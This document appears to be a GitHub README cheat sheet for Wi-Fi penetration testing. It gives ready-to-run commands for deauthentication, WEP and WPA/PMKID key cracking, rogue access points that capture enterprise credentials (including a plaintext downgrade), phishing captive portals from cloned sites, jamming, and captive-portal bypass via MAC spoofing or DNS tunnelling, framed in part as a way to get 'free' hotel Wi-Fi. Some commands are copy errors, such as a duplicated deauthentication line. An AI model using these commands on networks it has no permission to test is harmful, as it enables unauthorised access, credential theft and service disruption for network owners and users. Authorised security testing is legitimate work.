# Awesome Wifi pentesting


## Reconaissance frameworks

- [Acrylic](https://www.acrylicwifi.com/) (Windows)
- [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng) (Linux)


-----------------------------------------

## Basic commands

### Wireless interfaces status

Check if the interface is up
```bash
ifconfig
```

Check if the interface is in monitor or managed mode
```bash
ifconfig
```

Check if the device is detected
```bash
lsusb
```

### Set monitor mode

Set an environment variable using *VARIABLE=value*. Example: *IFACE=wlan0*

```bash
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
```

### List networks

1. Set monitor mode

2. Run Airodump-ng-ng

```bash
airodump-ng $IFACE -c $CHANNEL -e $ESSID
```


### Deauthentication

Option 1: Deauthenticate a client

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

Option 2: Deauthenticate an AP (all the clients in the AP)

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

------------------------------------------

## Get hidden SSID

1. List networks

List the networks using Airodump-ng and get the AP's MAC address ($AP_MAC) and one from a client ($CLIENT_MAC). Do not stop the capture.

2. Deauthentication

In another terminal, deauthenticate a client or all of them. When Airodump-ng captures a handshake from this network, the name or ESSID will appear in the first terminal:

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```


------------------------------------------


## WEP 

### Cracking password - No clients

1. Start capture

```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```


2. Fake authentication + Arp Request Replay Attack + Deauthenticate user -> Accelerate the IV capture. Stop airodump capture when you have around 100.000 different IVs

```bash
aireplay-ng -1 0 -e $AP_NAME -a $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -3 -b $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
aircrack-ng $PCAP_FILE
```

3. Crack the password using Aircrack-ng

```bash
aircrack-ng $PCAP_FILE
```

------------------------------------------

## WPA-Personal

### Cracking the 4-way-handshake

1. Start capture

```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```

2. Deauthenticate an user. Stop airodump capture when you see a message 'WPA handshake: $MAC'

```bash
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Option 1: Crack the handshake using Aircrack-ng

```bash
aircrack-ng -w $WORDLIST capture.cap
```

4. Option 2: Crack the handshake using Pyrit

```bash
pyrit -r $PCAP_FILE analyze
pyrit -r $PCAP_FILE -o $CLEAN_PCAP_FILE strip
pyrit -i $WORDLIST import_passwords
pyrit eval
pyrit batch
pyrit -r $CLEAN_PCAP_FILE attack_db
```


### PMKID attack

1. Install the needed tools 

```bash
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool && make && make install && cd ..
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools && make && make install
```

2. Create a text file ($FILTER_FILE) and add the MAC address without ":". You can use *sed* and redirect the output to a file:

```bash
echo $MAC | sed 's/://g' > $FILTER_FILE
```

3. Capture PMKID

```bash
hcxdumptool -i $IFACE -o $PCAPNG_FILE --enable__status=1 --filterlist=$FILTER_FILE --filtermode=2
```

4. Create $HASH_FILE and crack it

```bash
hcxpcaptool -z $HASH_FILE $PCAPNG_FILE

hashcat -a 0 -m 16800 $HASH_FILE $WORDLIST --force
```


### Wordlists/Dictionaries

- https://github.com/kennyn510/wpa2-wordlists


------------------------------------------

## WPA-Enterprise

### Radius brute force

- [Auto-EAP](https://github.com/Tylous/Auto_EAP)

------------------------------------------

## Fake Access Points

### Frameworks

- [Eaphammer](https://github.com/s0lst1c3/eaphammer)


### Hostapd: Creating ordinary APs

```
hostapd $CONFIGURATION_FILE.conf
```

Configuration files:

- [802.11b/g/n with WPA2-PSK and CCMP](https://wiki.gentoo.org/wiki/Hostapd#802.11b.2Fg.2Fn_with_WPA2-PSK_and_CCMP)
- [802.11a/n/ac with WPA2-PSK and CCMP](https://wiki.gentoo.org/wiki/Hostapd#802.11a.2Fn.2Fac_with_WPA2-PSK_and_CCMP)
- [802.11b/g/n triple AP](https://wiki.gentoo.org/wiki/Hostapd#802.11b.2Fg.2Fn_triple_AP)
- [802.11ax or WPA3](https://github.com/vanhoefm/hostap-wpa3/blob/master/hostapd/hostapd_wpa3.conf)


### Hostapd-wpe 

Hostapd-wpe is a patched version of Hostapd which captures the hashes during the authentication proces.

[Installation script](WPA2-enterprise-conf/install.sh). It was tested in Ubuntu 16.04 

[AP creation script](WPA2-enterprise-conf/hostapd_wpe_init.sh). Syntax:

```bash
sh hostapd_wpe_init.sh $AP_NAME
```


### Freeradius-wpe 

Using the Hostapd version 2.6 and Freeradius-wpe, the patched version of Freeradius, it is possible to capture the hashes during the authentication process. However, it is also possible to do a **downgrade attack** which may force the clients to send the **credentials (username and password) in  plaintext**.

[Installation script](WPA2-enterprise-conf/install.sh). It was tested in Ubuntu 16.04 

[AP creation script](WPA2-enterprise-conf/freeradius_wpe_init.sh). Syntax:

```bash
sh freeradius_wpe_init.sh ap_name 
```

[Log reading script](WPA2-enterprise-conf/freeradius_wpe_read.sh). Syntax:

```bash
sh freeradius_wpe_read.sh ap_name 
```

-------------------------------------

## Captive portals

### Fake captive portals

[Wifiphiser](https://github.com/wifiphisher/wifiphisher): It is possible to update the code of the examples provided and create a customized captive portal. Fot that, recompile the project (*python setup.py install*) or use the binary in *bin*. 

For example, you can clone a website using [HTTrack](https://www.httrack.com/) and add the result in a new folder in *wifiphisher/data/phishing-pages/*new_page*/html* and a configuration file in  *wifiphisher/data/phishing-pages/*new_page*/config.ini*. Check the other phishing pages examples to see how this can be done. 

This command works correctly in the latest Kali release (with hostapd installed):

```
cd bin && ./wifiphisher -aI $IFACE -e $ESSID --force-hostapd -p $PLUGIN -nE
```


### Captive portal bypass - MAC spoofing

The first method to bypass a captive portal is to change your MAC address to one of an already authenticated user

- [Wifi Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin)

- [Poliva script](https://raw.githubusercontent.com/poliva/random-scripts/master/wifi/hotspot-bypass.sh)


- [Hackcaptiveportals](https://github.com/systematicat/hack-captive-portals)


### Captive portal bypass - DNS tunnelling

A second method is creating a DNS tunnel. For this, it is necessary to have an accessible DNS server of your own. You can use this method to bypass the captive portal and get "free" Wifi in hotel, airports...


**DNS server IP**

Check the domain names are resolved:

```
nslookup example.com
```

Get the IP:

```
arp-scan -I $IFACE --localnet
```

**Download Iodine**

- Windows: https://code.kryo.se/iodine/

- Linux: *apt install iodine*


**DNS records**

Create 2 DNS records in Digital ocean:

- Tipo A:  dns.$DOMAIN $SERVER_IP (Example: dns.domain.com 139.59.172.117)

- Tipo NS: hack.$DOMAIN dns.$DOMAIN (Example: hack.domain.com dns.domain.com)


**Execution**

*Server*

```
iodined -f -c -P $PASS -n $SERVER_IP 10.0.0.1 hack.$DOMAIN
```

Check if it works correctly in https://code.kryo.se/iodine/check-it/ç


*Client*

```
iodine -f -P $PASS $DNS_SERVER_IP hack.$DOMAIN
```


*Tunnel*

```
ssh -D 8080 user@10.0.0.1
```

---------------------------------------------


## Other tools

### Krack Attack

- [Krack Attack Test Scripts](https://github.com/vanhoefm/krackattacks-scripts)


### OSINT

- [Wigle](https://wigle.net/)


### Jamming

- [Wifijammer](https://github.com/DanMcInerney/wifijammer) - This program can send deauthentication packets to both APs and clients. 

An example to deauthenticate all the devices except a Fake Acess Point:

```
sudo ./wifijammer -i $IFACE -s $FAKE_AP_MAC
```

---------------------------------------------

## Other frameworks
- [Ekahau](https://www.ekahau.com/) - Useful for Wi-Fi planning (Windows) 
- [Vistumbler](https://www.vistumbler.net/) - Useful for wardriving (Windows)
- [Sniffair](https://github.com/Tylous/SniffAir) (Linux)

---------------------------------------------

## Note

Feel free to contribute!
